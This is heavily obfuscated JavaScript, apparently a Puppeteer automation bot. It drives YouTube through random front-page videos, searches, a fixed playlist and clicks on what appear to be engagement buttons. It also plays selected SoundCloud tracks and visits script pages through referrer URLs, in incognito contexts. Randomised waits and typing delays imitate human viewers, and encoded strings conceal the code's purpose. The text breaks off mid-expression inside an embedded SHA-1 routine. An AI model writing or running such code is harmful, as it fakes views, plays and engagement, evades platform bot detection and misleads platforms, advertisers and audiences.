function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x16d3 + -0x1 * 0x445 + -0x44 * -0x66);
    let h = e[f];
    return h;
  }, d(b, c);
}
const a1 = b,
  a0 = c,
  Z = d;

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x16d3 + -0x1 * 0x445 + -0x44 * -0x66);
    let h = e[f];
    if (b['KphRxK'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x252 + 0x1 * 0xa55 + 0x1 * -0x803, s, t, u = -0x196c + -0xd7e + 0x11 * 0x24a; t = n['charAt'](u++); ~t && (s = r % (-0x34d + -0x1391 * 0x1 + 0x16e2) ? s * (0x1f52 + -0x22e1 * 0x1 + 0x3cf) + t : t, r++ % (-0x1 * 0x1f41 + -0x1f2f + 0x3e74)) ? p += String['fromCharCode'](0x1221 * 0x2 + 0x30 * -0x4d + -0x14d3 * 0x1 & s >> (-(0x1 * 0x731 + 0x3 * -0x3d + -0x678) * r & 0x1d3b + -0x42a * 0x1 + -0x190b)) : -0xb66 * -0x1 + -0x1af * 0x5 + -0x2fb) {
          t = o['indexOf'](t);
        }
        for (let v = 0x2574 + 0xade * 0x3 + -0x460e, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x1fa6 * -0x1 + 0x61d * -0x3 + -0xd3f))['slice'](-(-0xf31 * -0x1 + -0x12 * 0x166 + 0x1 * 0x9fd));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x1f38 + 0x1 * -0x881 + -0x16b7,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x1376 + -0x1 * 0xe31 + 0x1 * 0x21a7; u < -0x1 * 0x5f5 + 0x1b83 + -0x148e; u++) {
          p[u] = u;
        }
        for (u = 0x1403 + 0xf36 + 0x2339 * -0x1; u < 0x2b + 0x1671 + -0x159c; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x1541 + 0x1 * 0x24bb + -0xe7a), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x187c + -0x2507 * 0x1 + 0x3d83, q = 0x9 * -0x3e3 + 0x35c + 0x1f9f * 0x1;
        for (let v = 0x109c + 0x5be + -0x165a; v < n['length']; v++) {
          u = (u + (0x21e2 + 0x2047 + -0x4228 * 0x1)) % (0x959 + 0x1 * -0x418 + 0x63 * -0xb), q = (q + p[u]) % (0x20fe + -0x2089 + 0x8b), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x7 * 0x9c + -0x1 * -0x2227 + 0x91 * -0x33)]);
        }
        return t;
      };
      b['pCEKMn'] = m, c = arguments, b['KphRxK'] = !![];
    }
    const j = e[0x357 + 0x48b * 0x1 + -0x7e2],
      k = f + j,
      l = c[k];
    return !l ? (b['gsGces'] === undefined && (b['gsGces'] = !![]), h = b['pCEKMn'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x1937 + 0xbbb + -0x24f1))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x103c + -0x240b * 0x1 + 0x13cf), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x52e2 + -0x9a1c + 0xbc6a + (0x7507 + -0x738 + -0x7 * 0x751) * random()) : await standardWaitForNetIdle(f), await wait(0x1e * 0x51 + -0x2535 * -0x1 + -0x1 * 0x1b2b + (0x5 * 0x135 + 0x45c + -0x1 * -0x1cab) * random()), -0x42c + 0xcb3 + -0x1 * 0x886;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x5e7 * -0x5 + -0x216e + 0x7d1 * 0x3), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x1 * 0x5cb + -0x1 * -0x83f + -0x273 * 0x1;
}
async function randomWait() {
  return await wait(0x21f7 + -0x287 * -0xd + -0x2f4a * 0x1 + (0x13 * 0x58 + -0xe * 0x130 + 0x1da0) * random()), 0xc5f + 0x4cf + -0x112d;
}

function a() {
  const bp = [
    'zxiUAw8UlIKSxW',
    'W57dUqZdLLS',
    'yxjYyxLcDwzMzq',
    'vlBji8TOax',
    '0\x20(Windows',
    'easyfork.o',
    'W5pcLmo4W77dV0zxCN53',
    'Mozilla/5.',
    'j1JdPSoyFG',
    'ro.theme-l',
    'Chrome/',
    'CxvLCNLtzwXLyW',
    'P0NjLaBed-',
    'fSoIWRNdI8o+W5ZcGmkAnCow',
    'obal-name-',
    'iWzezFWpU7',
    'i2j1DhrVBIa+ia',
    'Ahr0Chm6lY9NCG',
    'zNjVBq',
    'fakir',
    'Lj1EcSMGey',
    'WRSEo13cV0BdRmklzSkN',
    'u6RVZKcN9z',
    'com/@Legal',
    'finalized',
    '/founcs/Li',
    'TixW__6Eer',
    'W7pdHmo+WOeEWP/cV098nG',
    '8zNp8EOpGd',
    'CMCVzw4VC2nYAq'
  ];
  a = function() {
    return bp;
  };
  return a();
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x16d3 + -0x1 * 0x445 + -0x44 * -0x66);
    let h = e[f];
    if (c['irqRhN'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x252 + 0x1 * 0xa55 + 0x1 * -0x803, r, s, t = -0x196c + -0xd7e + 0x11 * 0x24a; s = m['charAt'](t++); ~s && (r = q % (-0x34d + -0x1391 * 0x1 + 0x16e2) ? r * (0x1f52 + -0x22e1 * 0x1 + 0x3cf) + s : s, q++ % (-0x1 * 0x1f41 + -0x1f2f + 0x3e74)) ? o += String['fromCharCode'](0x1221 * 0x2 + 0x30 * -0x4d + -0x14d3 * 0x1 & r >> (-(0x1 * 0x731 + 0x3 * -0x3d + -0x678) * q & 0x1d3b + -0x42a * 0x1 + -0x190b)) : -0xb66 * -0x1 + -0x1af * 0x5 + -0x2fb) {
          s = n['indexOf'](s);
        }
        for (let u = 0x2574 + 0xade * 0x3 + -0x460e, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x1fa6 * -0x1 + 0x61d * -0x3 + -0xd3f))['slice'](-(-0xf31 * -0x1 + -0x12 * 0x166 + 0x1 * 0x9fd));
        }
        return decodeURIComponent(p);
      };
      c['DuBaBY'] = i, b = arguments, c['irqRhN'] = !![];
    }
    const j = e[0x1f38 + 0x1 * -0x881 + -0x16b7],
      k = f + j,
      l = b[k];
    return !l ? (h = c['DuBaBY'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    const R = b;
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + R(0x6, '326N') + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x20ae + 0x1 * 0x1051 + 0x105d, 0x1b83 + 0x1f18 + -0x3a94), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0xf01c + 0xb685 + 0xbc41 * -0x1) * getRandomInt(0x2b + 0x1671 + -0x169a, -0x1541 + 0x1 * 0x24bb + -0xf75), h)), -0x187c + -0x2507 * 0x1 + 0x3d84;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x9 * -0x3e3 + 0x35c + 0x1f9f * 0x1;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x109c + 0x5be + -0x1659]['split']('\x20');
    for (let k = 0x21e2 + 0x2047 + -0x4229 * 0x1; k < i['length']; k += 0x959 + 0x1 * -0x418 + 0x4f * -0x11)
      j += i[k] * h[i[k + (0x20fe + -0x2089 + -0x74)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const S = c,
      j = Array['from'](document[S(0xb) + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x7 * 0x9c + -0x1 * -0x2227 + 0x8b * -0x37)['map'](l => Array['from'](l['children']))['flat'](0x357 + 0x48b * 0x1 + -0x7e1)['map'](l => l['childNodes'][0x235f + 0xe8c + -0x31ea]['childNodes'][-0x1 * 0x264d + 0x2109 + 0x2a2 * 0x2]['childNodes'][-0x1821 + -0x1760 * -0x1 + 0x1 * 0xc2]['childNodes'][-0x269f * 0x1 + 0xcfe + -0x1 * -0x19a1]['childNodes'][-0x929 * -0x3 + 0x1 * -0x378 + 0xe * -0x1b7]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x2b3 * -0x2 + -0x15a * -0x1 + -0x1fd * -0x4, -0x13f5 + -0x136a + -0x11 * -0x377)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x724d + -0x34ed + 0xe1d2);
  const h = await getMaxTime(f),
    i = Math['min']((0x419 * 0xd + -0x1 * 0x43a5 + 0xf8c0) * getRandomInt(-0x25b0 + -0x8f * -0x1 + -0xc61 * -0x3, 0x43 + 0xb2 * 0x3 + -0x1 * 0x254), h);
  return await wait(i), -0x7 * 0x36f + 0xc1 * 0xf + -0xcbb * -0x1;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0xa * -0x71 + -0x1ce7 + 0x2151]['children'][-0x2412 + 0x7 * 0x1d6 + 0x1738]['children'][0xce2 + -0x2 * 0xb43 + 0x9a4]['children'][-0x9 * 0x4d + -0xb * -0x12d + -0xa3a]['children'][0x22ca + 0xdeb + -0x30b5]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x1 * 0xec3 + 0x100e + -0x16 * 0xf;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x18ad * -0x1 + -0x1c1 + 0x1ad2 + (-0x5e1 + -0xd41 + 0x1354) * random()
  }), await wait(-0xfa + -0x833 + 0x25 * 0x4d + (0xced + 0x14ba + 0x5 * -0x67f) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    const T = c;
    if (!await f['evaluate'](() => Array[T(0x12)](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x18b3 + 0x602 * -0x4 + -0xd * 0xd]['childNodes'][-0x25 * 0xdc + 0x1526 * -0x1 + 0x34f3]['childNodes'][-0x10b9 + 0x2 * -0x1cd + 0x1454]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x5 * 0x551 + 0x1 * 0xb34 + -0x25c4]['childNodes'][0x2b4 + 0x2170 + -0x2424]['childNodes'][0x1ca3 * 0x1 + -0x5dc * -0x1 + -0x227d]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x115b + 0x17eb + -0x68f),
          r = -0x2364 + -0xdcf + 0x3133;
        for (let u = -0x1e02 + 0x2605 + 0x7 * -0x125; u < q['length']; u += 0x3 * -0x5a + 0xb78 + -0xa68)
          r += q[u] * k[q[u + (-0x39e + -0x1c31 + 0x1 * 0x1fd0)]];
        return r;
      }(n);
  });
  await wait((0x1 * -0x69e2 + -0x6693 + 0x3569 * 0x5) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x78e1 * 0x1 + 0x1a915 + 0x2 * -0x22ea) * getRandomInt(0x108 * 0x19 + 0x581 * 0x2 + -0x24c9, 0x157e + -0xc7a * -0x1 + -0x21ee), h + (-0xd4 + -0x13d8 + 0x1f * 0x14c));
  return await wait(i), -0x1 * -0x709 + 0x612 * -0x2 + 0x51c;
}
async function keyWatch(f) {
  const U = c;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x12 * 0x134 + 0x1 * -0x111 + 0x16b9), log('clicking..' + '.'), await f['click'](U(0x10) + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x1a3d + 0x9f1 * -0x1 + 0x2 * -0x24a + (-0x8bf + -0x198d + 0x2634) * Math['random']());
    });
  }, 0x2bb6 + -0x17c * 0x1 + -0xee2);
  await wait(0x7de97 + 0x88fe + 0x5 * -0xc3f1);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x9d76 + 0x121b2 * 0x1 + -0x4 * 0x3532) * getRandomInt(0x10db + -0xcd * -0x7 + -0x1672, -0x2 * 0xe93 + 0xcae + -0x1091 * -0x1)), clearInterval(h), 0x337 + -0x2 * 0x28d + 0x1e4;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x1c5 * 0x10 + 0x153a + 0x716;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x220f + -0x1970 + -0x3b8 * -0x10;
    await randomWait();
  }
  return -0x1390 + 0x3 * -0x5c9 + 0x24ec;
}

function fetchRandomSC() {
  return Math['random']() <= -0x1320 + -0x92c * 0x4 + -0x1be8 * -0x2 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x1ef4 + -0x21f * -0x1 + 0xb * 0x29f + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    const Y = b;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x1b7d + -0xc7 * -0x1 + -0x107 * -0x1a + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x53 * 0x59 + -0x1f4c + 0x3c27;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          const V = d;
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + V(0x9) + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0xa9 * -0x1fd + 0x13377 * -0x1 + 0x33344 + getRandomInt(-0x2e * -0x12d + -0x46bb + 0xbb * 0x67, -0xda91 * 0x1 + 0xc78f + 0x8832));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x7c7 + -0xa * -0x1bb + 0xc8a * -0x2), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x1334 + 0xcd * 0x10 + -0x2004;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0xf85 + -0x8bc + 0x1841, -0x2476 * -0x1 + -0x1 * 0x17ba + -0xc8a)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x18d * 0x17 + -0x153c + -0x69f + floor((-0x20cb + 0x1ace + 0x9e5) * random()))), log('p2'), log(await s['evaluate'](() => {
        const X = c;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0xbd49e108 + -0x1457fb * 0xa86 + -0x1 * -0x98cbfa5a),
          0x64ca6b + -0xf01d9 * 0x3 + 0x483b20,
          0x1 * 0x5e73 + 0x4d2f * -0x1 + -0x6ebc * -0x1,
          0x2601 + -0x3 * -0x10b + 0x1451 * -0x2
        ], y = [
          0x23a7 * 0x1 + -0x23a2 + 0x13,
          -0xc2a + 0x157c + 0x316 * -0x3,
          -0xbb * 0x27 + -0x68 * -0x1f + 0xfed,
          -0x2529 + 0x21ae + -0xb * -0x51
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0xd0d + -0x83 * 0x17 + 0x3 * -0x6d)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x30 * 0x40 + 0xa80 + 0x4 * -0x5a0; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x1 * -0x1eca + 0x5e5 * -0x3 + 0x1 * 0x3079) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x1db1 + -0x12ab + 0x305c] = A[-0x1b68 * -0x1 + -0x3 * 0xc2b + 0x929] = A[-0xb * -0x27f + -0x15b8 + 0x16f * -0x4] = A[-0x2 * -0xbaf + -0x26d0 + 0xac * 0x17] = A[-0x9 * -0x1d3 + 0x1eb8 + -0x3a * 0xd0] = A[-0x11d7 * 0x2 + 0x133d + -0x1 * -0x1075] = A[-0xec * -0xe + 0x9f * 0x2 + -0x1 * 0xe21] = A[-0xe2c * 0x1 + -0x2ef * -0x1 + 0xb43] = A[-0x13ae + -0x3 * -0xc35 + -0x10ea] = A[0x1b61 + -0x283 + -0x18d6] = A[0x1b08 + 0x4 * 0x5d5 + -0xd * 0x3df] = A[0x1d * -0xd3 + -0x3ef * 0x8 + 0xb15 * 0x5] = A[-0x17 * 0x81 + -0x8cd * 0x2 + 0xe9e * 0x2] = A[0x24db + 0x5 * 0x16e + 0x16b * -0x1f] = A[0x6f0 + -0x1 * 0x1b34 + 0x1451] = A[0xd35 + 0xb05 + -0x182c * 0x1] = A[-0x66e * 0x3 + 0x430 + 0xf29 * 0x1] = 0x1286 + 0xb * 0x1d5 + 0x26ad * -0x1, this['blocks'] = A) : this['blocks'] = [
                -0x8e7 + 0x16f4 + 0xb * -0x147,
                0x1 * 0x5c5 + -0x5 * -0x17b + -0xd2c,
                -0x7d7 + 0x25c7 + -0x1 * 0x1df0,
                0x1db6 + 0xb8b + -0x2941,
                -0x48d + -0x14e5 + 0x2 * 0xcb9,
                -0xaf7 * 0x2 + -0x553 + 0x1b41,
                -0x71d * 0x3 + 0x3b * 0xa3 + -0x2 * 0x81d,
                0x1c0a + -0x4d4 * 0x4 + -0x45d * 0x2,
                -0x43 * -0x69 + 0x1bb7 * -0x1 + -0xf * -0x4,
                0x2 * -0xe9b + 0x24f9 + -0x7c3,
                -0x11b * -0x1b + 0x1b72 + -0x394b,
                0x1943 + -0x56d * -0x5 + -0x3464,
                0xa9f + 0x1 * -0x2 + -0xa9d,
                -0x2 * 0x66e + -0x3a * -0x44 + 0x2 * -0x146,
                0x8a2 + -0x1 * 0x4bd + -0x3e5,
                0xf40 + 0x9c + -0x1d * 0x8c,
                -0x5d0 * -0x1 + 0xf6a + 0xd * -0x1a2
              ], this['h0'] = -0x592d4c6 + 0xbaa29cc6 + -0x4dcaa4ff, this['h1'] = -0x159477011 + -0x3c6efb49 * -0x4 + 0x157592e76, this['h2'] = 0x46dcdb4 + 0x2afa * 0x2f04a + -0x16024306 * -0x1, this['h3'] = 0x1aba920 + -0x15975e8f * 0x1 + 0xd7062f * 0x2b, this['h4'] = -0x2 * 0x1f5d77e7 + 0xecc01873 + 0x15cdb94b, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x230d * 0x1 + 0x3b0 * 0x3 + -0x313 * 0xf, this['finalized'] = this['hashed'] = -0x2 * 0xe3b + -0x1e3c + 0x556 * 0xb, this['first'] = -0x167 * 0xb + -0x2459 + 0xa5b * 0x5;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x1e89 + 0x1b2f + -0x39b8, O = J['length'] || 0x7f + 0x1b3a + -0x1bb9, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0xa3 + -0x13 * -0xc0 + -0xee3, P[0x20ce + 0x43 * -0x69 + -0x2f * 0x1d] = this['block'], P[0xb84 + -0xdc8 + 0x254] = P[-0x1 * -0x130d + 0x22f3 + -0x1 * 0x35ff] = P[-0x1ed4 * -0x1 + -0x33 * 0x47 + -0x58f * 0x3] = P[-0x26cd + 0x19c8 + 0xd08] = P[-0x19 * 0x171 + -0x1cb7 + -0x1031 * -0x4] = P[0xa21 * 0x2 + 0x1a95 + -0x2 * 0x1769] = P[0x2 * -0x10be + 0x2057 + 0x12b] = P[-0x611 + -0x1c7b * -0x1 + -0xb * 0x209] = P[-0x1 * 0x1b7 + 0x1 * 0x2353 + -0x2194] = P[0x252b + 0x5d * -0x11 + -0x1ef5] = P[-0x31d * -0x5 + 0x11aa + -0x2131] = P[0xd51 + -0x4 * 0x897 + -0xa8b * -0x2] = P[-0x1314 + 0x1b3a + -0x81a] = P[0x71e + -0xc02 + -0x5 * -0xfd] = P[0x1891 + 0x1a4d * -0x1 + 0x2 * 0xe5] = P[0x1dd * 0x6 + 0x2627 * -0x1 + 0x1b08] = 0x27f * 0x2 + 0x219b + -0x29 * 0xf1), K) {
                    for (N = this['start']; M < O && N < -0x1bb5 + 0x6 * 0x369 + 0x77f * 0x1; ++M)
                      P[N >> -0x1ce8 + 0x10f6 + 0xbf4] |= J[M] << y[-0x68e * -0x3 + 0x1 * 0x75c + -0x1b03 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x15 * -0x12e + 0x266 + -0x1aec; ++M)
                      (L = J['charCodeAt'](M)) < 0x3fc + -0xa51 * 0x1 + -0x3 * -0x247 ? P[N >> -0x1459 + -0x1ff0 + 0xb * 0x4c1] |= L << y[0x1609 + 0x23cf + -0x5 * 0xb91 & N++] : L < 0x7e2 + -0x1cd3 + 0x1cf1 ? (P[N >> 0x216b + 0x1b50 + -0x3cb9] |= (-0x3 * -0x7cc + -0x6f2 + 0x1 * -0xfb2 | L >> 0xa50 + -0x192e + 0xee4) << y[0x1632 + 0x56f + -0x586 * 0x5 & N++], P[N >> -0xae * -0x1 + 0x1a4d + -0x1af9 * 0x1] |= (-0x1ef6 + -0x29 * -0xc1 + 0x8d | -0xb2b + 0x893 * 0x1 + 0x2d7 & L) << y[0x214 * -0x7 + -0x2 * 0xa61 + 0x2351 & N++]) : L < -0x6c20 + 0x2b9 + -0x1 * -0x14167 || L >= -0xdd2 * -0x3 + -0x2 * 0x66cb + 0x18420 ? (P[N >> 0x2691 + -0x253f + -0x150] |= (0xa2b + 0x505 + -0xe50 | L >> -0x1 * -0x11e3 + 0x7af * -0x1 + -0xa28 * 0x1) << y[-0x8b5 * -0x3 + -0x2f9 + -0x1723 & N++], P[N >> -0x13 * -0x53 + 0x8ab + -0xed2] |= (-0x1c03 + -0x1 * -0x1e81 + -0x1fe | L >> 0xfdc + -0xad7 + -0x4ff & 0x419 * -0x3 + 0x2d7 + 0x9b3) << y[0x4ae + -0x61f * -0x1 + 0x2 * -0x565 & N++], P[N >> 0x1073 + 0x2056 + -0x30c7 * 0x1] |= (0x1d05 + -0x3 * 0x78b + -0x2f2 * 0x2 | 0x6ab + 0x13bf + -0x1a2b & L) << y[0x23d + 0x8b4 * 0x4 + 0x16 * -0x1af & N++]) : (L = -0x73dd + -0x152 * 0x2f + 0x1b1eb * 0x1 + ((0x184a + -0x8f2 + 0xb59 * -0x1 & L) << -0x1293 + 0x78 * -0x40 + -0x5f * -0x83 | -0x5b * 0x29 + -0x9ef * -0x2 + -0x1 * 0x14c & J['charCodeAt'](++M)), P[N >> 0x19b6 + 0x604 + -0x1fb8] |= (-0x415 + -0x13 * -0xd9 + -0x21 * 0x56 | L >> -0xead + -0x97 * 0x35 + 0x2e02 * 0x1) << y[0x9da + 0xb90 + -0x1567 & N++], P[N >> -0x55 * 0x2b + -0x1 * 0x112c + 